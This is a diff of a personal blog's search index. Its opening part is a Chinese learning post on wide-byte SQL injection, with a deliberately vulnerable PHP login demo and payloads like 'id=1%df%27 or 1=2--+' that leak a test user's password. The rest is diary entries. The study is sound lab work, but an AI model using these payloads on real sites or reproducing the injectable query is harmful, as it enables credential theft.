+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"sql thing: "</span> <span class="token operator">.</span><span class="token variable">$sql</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$row</span><span class="token operator">=</span>@<span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your name is: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your psw: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>进行测试</strong></p>
+<p>1.<code>id=%27%27</code><br>报错：<br><code>sql thing: SELECT * FROM user WHERE id=&#39;\&#39;\&#39;&#39; LIMIT 0,1&lt;br&gt;&lt;br&gt;</code></p>
+<p>2.<code>id=1%27%df%20or%201=2--+</code></p>
+<p><code>sql thing: SELECT * FROM user WHERE id=&#39;1\&#39;� or 1=2-- &#39; LIMIT 0,1&lt;br&gt;&lt;br&gt;Your name is: John&lt;br&gt;your psw: daidgiaegigak</code></p>
+<p>3.<code>id=1%df%27%20or%201=2--+</code></p>
+<p><code>sql thing: SELECT * FROM user WHERE id=&#39;1�\&#39; or 1=2-- &#39; LIMIT 0,1&lt;br&gt;&lt;br&gt;Your name is: John&lt;br&gt;your psw: daidgiaegigak</code></p>
+<p>第三条就是我们所说的组成汉字，</p>
+<p><code>�\</code>变成一个汉字（这里解析不出来），所以 id &#x3D; ‘1’ or 1&#x3D;2,单引号逃逸成功，也就成功执行了sql注入。</p>
+<p>还可以换其他sql注入语句，这里只是简单测试就不写了。</p>
+<p>值得研究的是，第二条，也是打错了的，但是注入依旧成功了——是注释的作用还是反斜杠的注释作用？</p>
+<hr>
+<hr>
+
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2>]]></content>
+      <tags>
+        <tag>PHP</tag>
+        <tag>LEARN</tag>
+        <tag>SQL-Injection</tag>
+      </tags>
   </entry>
   <entry>
-    <title>daily</title>
-    <url>/rustymoon/2023/11/26/daily/</url>
-    <content><![CDATA[<h1 id="11-26"><a href="#11-26" class="headerlink" title="11-26"></a>11-26</h1><p>这个周在当尖叫皇后，就是别人负责皇后我负责尖叫。</p>
-<p>我也不知道为什么这个周会过得如此迷惑的忙碌。</p>
-<p>可能是快来到的期末和一堆被冷落的作业。</p>
-<p>所以本周我就做了一个firewall ppt，做了实验课的实验一。</p>
-<p>迷茫、惶恐、无语、怒极反笑。</p>
-<p>总结一下就是，看见firewall这个词就想吐了。</p>
-<p>在周天晚上一把子把所有有关firewall的笔记都删除了，可能得缓缓才能写出笔记上传。而且我的课设作业和实验一个接一个，这辈子没这么烦过。</p>
-<p>之前还在问chatgpt怎么写weekly to-do list，现在我已经知道了。这么多破事（姑且让我这么称呼吧），好了写完这个我就要回去了，我要去买晚饭我要饿死了。</p>
-<p>回去路上整理to do list吧。<br>一张心情写照：</p>
-<img src="/rustymoon/2023/11/26/daily/%E9%9D%A2%E5%AF%B9jyp.jpg" class>
-
-<h1 id="11-27"><a href="#11-27" class="headerlink" title="11-27"></a>11-27</h1><p>今天稍微策划了一下时间，好了我现在要去学数电了，在这之前我学了ssrf和sql注入了的一部分，但是但是，还没有彻底搞懂，之前卡住我的那个demo问题原来是变量名少打一个h……这个键盘的h键真是……<br>配图以表心情：</p>
-<img src="/rustymoon/2023/11/26/daily/%E7%94%84%E5%AC%9B%E4%BC%A01.jpg" class>]]></content>
+    <title>Funcky_Night</title>
+    <url>/rustymoon/2023/10/28/Funcky-Night/</url>
+    <content><![CDATA[<p>随手起的名字，只是忽然想起来在几首歌里都听过这个funcky。</p>
+]]></content>
       <tags>
-        <tag>orn</tag>
+        <tag>ORN</tag>
       </tags>
   </entry>
   <entry>
@@ -454,6 +517,32 @@ Stack trace:
       <tags>
         <tag>READING</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>daily</title>
+    <url>/rustymoon/2023/11/26/daily/</url>
+    <content><![CDATA[<h1 id="11-26"><a href="#11-26" class="headerlink" title="11-26"></a>11-26</h1><p>这个周在当尖叫皇后，就是别人负责皇后我负责尖叫。</p>
+<p>我也不知道为什么这个周会过得如此迷惑的忙碌。</p>
+<p>可能是快来到的期末和一堆被冷落的作业。</p>
+<p>所以本周我就做了一个firewall ppt，做了实验课的实验一。</p>
+<p>迷茫、惶恐、无语、怒极反笑。</p>
+<p>总结一下就是，看见firewall这个词就想吐了。</p>
+<p>在周天晚上一把子把所有有关firewall的笔记都删除了，可能得缓缓才能写出笔记上传。而且我的课设作业和实验一个接一个，这辈子没这么烦过。</p>
+<p>之前还在问chatgpt怎么写weekly to-do list，现在我已经知道了。这么多破事（姑且让我这么称呼吧），好了写完这个我就要回去了，我要去买晚饭我要饿死了。</p>
+<p>回去路上整理to do list吧。<br>一张心情写照：</p>
+<img src="/rustymoon/2023/11/26/daily/%E9%9D%A2%E5%AF%B9jyp.jpg" class>
+
+<h1 id="11-27"><a href="#11-27" class="headerlink" title="11-27"></a>11-27</h1><p>今天稍微策划了一下时间，好了我现在要去学数电了，在这之前我学了ssrf和sql注入了的一部分，但是但是，还没有彻底搞懂，之前卡住我的那个demo问题原来是变量名少打一个h……这个键盘的h键真是……<br>配图以表心情：</p>
+<img src="/rustymoon/2023/11/26/daily/%E7%94%84%E5%AC%9B%E4%BC%A01.jpg" class>]]></content>
+      <tags>
+        <tag>orn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/rustymoon/2023/10/28/hello-world/</url>
+    <content><![CDATA[<p>More info: <a href="https://hexo.io/docs">Deployment</a></p>
+]]></content>
   </entry>
   <entry>
     <title>taocms审计中2</title>
